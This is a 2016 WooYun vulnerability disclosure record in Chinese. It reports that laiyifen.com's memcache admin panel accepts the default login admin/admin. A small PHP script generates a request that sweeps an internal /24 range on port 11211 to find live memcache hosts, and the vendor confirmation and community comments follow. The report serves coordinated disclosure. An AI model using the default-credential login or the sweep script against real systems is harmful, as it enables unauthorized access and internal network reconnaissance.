{"id": 86586, "wybug_id": "wooyun-2016-0183041", "wybug_title": "来伊份主站memcache未授权访问可探测内网（附测试脚本）", "wybug_corp": "laiyifen.com", "wybug_author": "镱鍚", "wybug_date": "2016-03-10 17:35", "wybug_open_date": "2016-04-25 10:04", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-25：\t细节向公众公开  简要描述： 看来伊份这么多洞上首页，我也来一份!^_^ 详细说明：  URL:\nhttp://www.laiyifen.com/memadmin/index.php\n来一份主站，memcache管理后台\n\nadmin  admin 成功登陆\n\n这里可以添加内网IP，从而探测内网主机存活状态经过前人思路指点，加上抓包流量分析，点击开始管理，抓包\n\n\n\n在经过url解码，即可找出规律。这里利用10.3.2.X这个网段来测试，shell脚本不会，就自己写了个php的，将所有的c段添加到管理，成功\n\n\n\n最后就简单了，遍历num参数爆破，成功探测到一台主机\n\n\n\n相信你们内网不止这一台memcache服务器，这里证明即可，就难得去一一探测了。危害你们更懂。。利用脚本\n<?php\t$str1='data[0][con][0][num]=255&';\t$str3='data[1][conp][0][num]=0';\t\tfor($i=0;$i<255;$i++){\t\t$str2='data[0][con][0][cons]['.$i.'][name]=n'.$i.'&data[0][con][0][cons]['.$i.'][host]=10.3.2.'.$i.'&data[0][con][0][cons]['.$i.'][port]=11211&data[0][con][0][cons]['.$i.'][ispcon]=0&data[0][con][0][cons]['.$i.'][timeout]=1&';\t\t$str1.=$str2;\t}\t\t$str1.=$str3;\t\techo $str1;?>\n写的太菜，大牛勿喷。。   漏洞证明：  URL:\nhttp://www.laiyifen.com/memadmin/index.php\n来一份主站，memcache管理后台\n\nadmin  admin 成功登陆\n\n这里可以添加内网IP，从而探测内网主机存活状态经过前人思路指点，加上抓包流量分析，点击开始管理，抓包\n\n\n\n在经过url解码，即可找出规律。这里利用10.3.2.X这个网段来测试，shell脚本不会，就自己写了个php的，将所有的c段添加到管理，成功\n\n\n\n最后就简单了，遍历num参数爆破，成功探测到一台主机\n\n\n\n相信你们内网不止这一台memcache服务器，这里证明即可，就难得去一一探测了。危害你们更懂。。利用脚本\n<?php\t$str1='data[0][con][0][num]=255&';\t$str3='data[1][conp][0][num]=0';\t\tfor($i=0;$i<255;$i++){\t\t$str2='data[0][con][0][cons]['.$i.'][name]=n'.$i.'&data[0][con][0][cons]['.$i.'][host]=10.3.2.'.$i.'&data[0][con][0][cons]['.$i.'][port]=11211&data[0][con][0][cons]['.$i.'][ispcon]=0&data[0][con][0][cons]['.$i.'][timeout]=1&';\t\t$str1.=$str2;\t}\t\t$str1.=$str3;\t\techo $str1;?>\n写的太菜，大牛勿喷。。   修复方案：  限制访问   版权声明：转载请注明来源 镱鍚@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2016-03-11 10:04 厂商回复： 谢谢大家的支持，我们尽快修复，非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-10 17:36 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:3099 漏洞数:616        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  这个有意思    \n     2016-03-10 17:38 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1523 漏洞数:366        | 1.乌云最帅的男人                        ...)\t\t \n  @爱上平顶山 确实呀 那个脚本写的有点意思    \n     2016-03-10 17:48 |    \t\t镱鍚 \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:32        | 。。！)\t\t \n  @爱上平顶山 @ 牛 小 帅\t大牛们，求不喷    \n     2016-03-10 17:57 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:31        | 是金子总会发光，在还未发光之前，先磨磨)\t\t \n  来学学 memcache  怎么探测内网，之前遇到过，只是一些信息泄露。    \n     2016-03-10 18:05 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:35        | test)\t\t \n  每天来来伊份    \n     2016-03-10 18:09 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1587 漏洞数:237        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  memcache里竟然有这样的地址    \n     2016-03-10 18:20 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:80        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  我是来看脚本的    \n     2016-03-10 18:24 |    \t\t镱鍚 \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:32        | 。。！)\t\t \n  @he1renyagao 其实就是信息泄露，标题党罢了    \n     2016-03-10 18:30 |    \t\tShAdow丶 \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:18        )\t\t \n  这个脚本确实有意思 哈哈    \n     2016-03-10 19:27 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1712 漏洞数:261        )\t\t \n  memcache未授权访问可探测内网？来学姿势。    \n     2016-03-10 19:37 |    \t\t镱鍚 \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:32        | 。。！)\t\t \n  @_Thorns 大牛见笑了，并不能探测内网，只能判断下内网memcache服务器的存活状态罢了    \n     2016-03-10 21:26 |    \t\tDleo \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:46        | talent)\t\t \n  @镱鍚 大牛 别忘了带小弟飞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}